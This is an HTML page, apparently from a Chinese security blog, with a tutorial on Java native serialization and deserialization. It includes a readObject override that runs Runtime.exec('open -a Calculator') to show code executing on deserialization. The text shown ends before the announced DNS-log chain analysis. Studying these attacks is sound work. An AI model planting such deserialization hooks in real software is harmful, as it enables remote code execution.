@@ -1,0 +1,525 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Java原生反序列化序列化和反序列化 Java序列化是指把Java对象转换为字节序列的过程；而Java反序列化是指把字节序列恢复为Java对象的过程。   序列化分为两大部分序列化是这个过程的第一部分，将数据分解成字节流，以便存储在文件中或在网络上传输。反序列化就是打开字节流并重构对象。对象序列化不仅要将基本数据类型转换成字节表示，有时还要恢复数据。恢复数据要求有恢复数据的对象实例。  为什么要进">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java原生反序列化+Dnslog链分析">
+<meta property="og:url" content="http://example.com/2024/07/04/Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Dnslog%E9%93%BE%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="Z1sec-Blog">
+<meta property="og:description" content="Java原生反序列化序列化和反序列化 Java序列化是指把Java对象转换为字节序列的过程；而Java反序列化是指把字节序列恢复为Java对象的过程。   序列化分为两大部分序列化是这个过程的第一部分，将数据分解成字节流，以便存储在文件中或在网络上传输。反序列化就是打开字节流并重构对象。对象序列化不仅要将基本数据类型转换成字节表示，有时还要恢复数据。恢复数据要求有恢复数据的对象实例。  为什么要进">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240619171758.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240620141240.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240620141358.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240620141713.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240620142409.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240620145042.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240620145131.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240620144755.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240620150347.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240620150520.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240620150650.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240620150639.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240620150745.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240620150950.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240620171602.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240621205737.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240621205756.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240621205814.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240621211832.png">
+<meta property="article:published_time" content="2024-07-04T08:41:01.000Z">
+<meta property="article:modified_time" content="2024-07-04T08:50:32.837Z">
+<meta property="article:author" content="z1">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/Pasted%20image%2020240619171758.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Java原生反序列化+Dnslog链分析</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/parttime/index.html">PartTime</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/07/04/TCP%E5%BA%94%E7%94%A8SQL%E6%B3%A8%E5%85%A5/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/07/04/1day-Geoserver%EF%BC%88CVE-2023-51444%EF%BC%89%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/07/04/Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Dnslog%E9%93%BE%E5%88%86%E6%9E%90/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/07/04/Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Dnslog%E9%93%BE%E5%88%86%E6%9E%90/&text=Java原生反序列化+Dnslog链分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/07/04/Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Dnslog%E9%93%BE%E5%88%86%E6%9E%90/&title=Java原生反序列化+Dnslog链分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/07/04/Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Dnslog%E9%93%BE%E5%88%86%E6%9E%90/&is_video=false&description=Java原生反序列化+Dnslog链分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Java原生反序列化+Dnslog链分析&body=Check out this article: http://example.com/2024/07/04/Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Dnslog%E9%93%BE%E5%88%86%E6%9E%90/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/07/04/Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Dnslog%E9%93%BE%E5%88%86%E6%9E%90/&title=Java原生反序列化+Dnslog链分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/07/04/Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Dnslog%E9%93%BE%E5%88%86%E6%9E%90/&title=Java原生反序列化+Dnslog链分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/07/04/Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Dnslog%E9%93%BE%E5%88%86%E6%9E%90/&title=Java原生反序列化+Dnslog链分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/07/04/Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Dnslog%E9%93%BE%E5%88%86%E6%9E%90/&title=Java原生反序列化+Dnslog链分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/07/04/Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Dnslog%E9%93%BE%E5%88%86%E6%9E%90/&name=Java原生反序列化+Dnslog链分析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/07/04/Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Dnslog%E9%93%BE%E5%88%86%E6%9E%90/&t=Java原生反序列化+Dnslog链分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">Java原生反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.1.</span> <span class="toc-text">序列化和反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%AF%E8%83%BD%E9%80%A0%E6%88%90%E5%8D%B1%E9%99%A9%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="toc-number">1.2.</span> <span class="toc-text">可能造成危险的方式</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Dnslog%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">Dnslog链分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#HashMap"><span class="toc-number">2.1.</span> <span class="toc-text">HashMap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Url"><span class="toc-number">2.2.</span> <span class="toc-text">Url</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-number">2.3.</span> <span class="toc-text">链分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84"><span class="toc-number">2.4.</span> <span class="toc-text">反射</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8F%8D%E5%B0%84%E4%BF%AE%E6%94%B9hashCode%E5%80%BC%E8%80%8C%E5%90%8E%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.5.</span> <span class="toc-text">利用反射修改hashCode值而后序列化</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Java原生反序列化+Dnslog链分析
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">z1</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-07-04T08:41:01.000Z" class="dt-published" itemprop="datePublished">2024-07-04</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Java原生反序列化"><a href="#Java原生反序列化" class="headerlink" title="Java原生反序列化"></a>Java原生反序列化</h1><h2 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h2><blockquote>
+<p><strong>Java序列化</strong>是指把Java对象转换为字节序列的过程；而<strong>Java反序列化</strong>是指把字节序列恢复为Java对象的过程。</p>
+</blockquote>
+<ul>
+<li><p>序列化分为两大部分<br>序列化是这个过程的第一部分，将数据分解成字节流，以便存储在文件中或在网络上传输。<br>反序列化就是打开字节流并重构对象。对象序列化不仅要将基本数据类型转换成字节表示，有时还要恢复数据。恢复数据要求有恢复数据的对象实例。</p>
+</li>
+<li><p>为什么要进行序列化与反序列化<br>当两个进程进行远程通信时，可以相互发送各种类型的数据，包括文本、图片、音频、视频等， 而这些数据都会以二进制序列的形式在网络上传送。那么当两个Java进程进行通信时，能否实现进程间的对象传送呢？答案是可以的。如何做到呢？这就需要Java序列化与反序列化了。换句话说，一方面，发送方需要把这个Java对象转换为字节序列，然后在网络上传送；另一方面，接收方需要从字节序列中恢复出Java对象。</p>
+</li>
+</ul>
+<p>当我们明晰了为什么需要Java序列化和反序列化后，我们很自然地会想Java序列化的好处。其好处一是实现了数据的持久化，通过序列化可以把数据永久地保存到硬盘上（通常存放在文件里），二是，利用序列化实现远程通信，即在网络上传送对象的字节序列。</p>
+<p>1、想把内存中的对象保存到一个文件中或者数据库中时候；<br>2、想用套接字在网络上传送对象的时候；<br>3、想通过RMI传输对象的时候</p>
+<ul>
+<li><p>序列化示例1</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.maven_2;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;  </span><br><span class="line">    <span class="comment">// 定义Person类，继承自Serializable  </span></span><br><span class="line">    String name;  </span><br><span class="line">    <span class="type">int</span> age;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;  </span><br><span class="line">        <span class="comment">// 定义方法  </span></span><br><span class="line">        <span class="built_in">this</span>.name = name;  </span><br><span class="line">        <span class="built_in">this</span>.age = age;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="comment">// toString方便观看  </span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +  </span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +  </span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializationExample1</span> &#123;  </span><br><span class="line">    <span class="comment">// 当前代码主类  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="comment">// main函数  </span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Alice&quot;</span>, <span class="number">30</span>);  </span><br><span class="line">        <span class="comment">// 实例化，在Java中创建一个名为 person 的 Person 类型的对象实例。  </span></span><br><span class="line">  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="comment">// 序列化对象  </span></span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fileOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;person.ser&quot;</span>);  </span><br><span class="line">            <span class="comment">// 将数据写入文件，系统将会创建一个新的 person.ser文件，如果该文件已经存在，系统将会覆盖原有文件内容  </span></span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOut);  </span><br><span class="line">            <span class="comment">// 将数据输出流连接到fileOut对象  </span></span><br><span class="line">            out.writeObject(person);  </span><br><span class="line">            out.close();  </span><br><span class="line">            fileOut.close();  </span><br><span class="line">            System.out.println(<span class="string">&quot;序列化成功!&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>反序列化示例1</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.maven_2;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeSerializationExample1</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="comment">// 反序列化对象  </span></span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fileIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;person.ser&quot;</span>);  </span><br><span class="line">            <span class="comment">// 读取person.ser  </span></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileIn);  </span><br><span class="line">            <span class="comment">// 通过fileIn对象连接到文件中，以便读取文件中序列化的 Java 对象数据，进行反序列化操作  </span></span><br><span class="line">            <span class="type">Person</span> <span class="variable">deserializedPerson</span> <span class="operator">=</span> (Person) in.readObject();  </span><br><span class="line">            <span class="comment">// 从文件中读取一个 Java 对象，并将其保存为 Person 类型的变量  </span></span><br><span class="line">            in.close();  </span><br><span class="line">            fileIn.close();  </span><br><span class="line">            System.out.println(deserializedPerson);  </span><br><span class="line">            <span class="comment">// 输出  </span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | ClassNotFoundException e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>解析下：</p>
+<ul>
+<li><p>ObjectOutputStream代表对象输出流<br>它的writeObject(Object obj)方法可对参数指定的obj对象进行序列化，把得到的字节序列写到一个目标输出流中。</p>
+</li>
+<li><p>ObjectInputStream代表对象输入流<br>它的readObject()方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。</p>
+</li>
+<li><p>序列化与反序列化示例2（重写readObject，readObject中使用了危险方法）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.maven_2;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person2</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> String name;  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> String status;  </span><br><span class="line">    <span class="comment">// transient不参与反序列化  </span></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person2</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;  </span><br><span class="line">        <span class="built_in">this</span>.name = name;  </span><br><span class="line">        <span class="built_in">this</span>.age = age;  </span><br><span class="line">        <span class="built_in">this</span>.status = <span class="string">&quot;Active&quot;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person2&#123;&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +  </span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +  </span><br><span class="line">                <span class="string">&quot;, status=&#x27;&quot;</span> + status + <span class="string">&#x27;\&#x27;&#x27;</span> +  </span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// private void writeObject(ObjectOutputStream out) throws IOException &#123;  </span></span><br><span class="line">    <span class="comment">//     out.defaultWriteObject();    //     // 自定义属性在序列化时的处理  </span></span><br><span class="line">    <span class="comment">//     // out.writeObject(status.toUpperCase());  </span></span><br><span class="line">    <span class="comment">// &#125;  </span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;  </span><br><span class="line">        in.defaultReadObject();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializationExample2</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">Person2</span> <span class="variable">person2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person2</span>(<span class="string">&quot;Alice&quot;</span>, <span class="number">30</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fileOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;person2.ser&quot;</span>);  </span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOut);  </span><br><span class="line">            out.writeObject(person2);  </span><br><span class="line">            out.close();  </span><br><span class="line">            fileOut.close();  </span><br><span class="line">            System.out.println(<span class="string">&quot;Person对象已序列化到person2.ser文件&quot;</span>);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Person2</span> <span class="variable">deserializedPerson</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fileIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;person2.ser&quot;</span>);  </span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileIn);  </span><br><span class="line">            deserializedPerson = (Person2) in.readObject();  </span><br><span class="line">            in.close();  </span><br><span class="line">            fileIn.close();  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | ClassNotFoundException e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化后的Person对象：&quot;</span> + deserializedPerson);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>解析下：</p>
+<ul>
+<li><code>private transient String status; </code>定义status变量，transient 标识的对象成员变量不参与序列化</li>
+<li><code>private void readObject</code>自定义readObject方法，若程序中自定义的readObject代码中存在危险代码，则可能导致危害。<br>示例：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;  </span><br><span class="line">    in.defaultReadObject();  </span><br><span class="line">    Runtime.getRuntime().exec(<span class="string">&quot;open -a Calculator&quot;</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+在反序列化时，会使用自定义readObject方法，此时则会调用到Runtime执行命令打开计算器。</li>
+</ul>
+<p>为什么重写readObject：在反序列化过程中需要特殊处理一些属性或者进行一些特定的逻辑，可以通过重写 <code>readObject</code> 和 <code>writeObject</code> 方法来实现。<br><img src="/images/Pasted%20image%2020240619171758.png"></p>
+<h2 id="可能造成危险的方式"><a href="#可能造成危险的方式" class="headerlink" title="可能造成危险的方式"></a>可能造成危险的方式</h2><ul>
+<li>重写readObject造成危害（少见）</li>
+<li>入口类包含可控可控类，该类中存在危险方法的类，或该类会调用其他危险方法的类，反序列化时会调用到。</li>
+</ul>
